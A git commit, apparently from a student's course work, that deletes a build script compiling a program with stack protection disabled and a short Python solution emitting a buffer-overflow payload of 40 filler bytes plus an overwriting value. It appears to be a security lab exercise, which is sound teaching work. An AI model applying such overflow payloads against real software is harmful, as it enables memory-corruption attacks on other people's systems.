eb1dad7d7b4f4da05e2fe3a6fb797bf1563b6545
vladpaun1 <vlad.paun06@gmail.com>
2026-03-19 18:05:13 +0100

    moved stuff around

--- assignment5/comp.sh
+++
@@ -1,2 +0,0 @@
-gcc -O0 -fno-stack-protector -std=gnu99 -c assignment.c -o assignment.o
-gcc assignment.o -T linker.ld -o assignment
--- assignment5/solution.py
+++
@@ -1,6 +0,0 @@
-#!/usr/bin/env python3
-import sys
-
-payload = b"A" * 40 + (0x35323032534f).to_bytes(8, "little")
-
-sys.stdout.buffer.write(payload + b"\n")
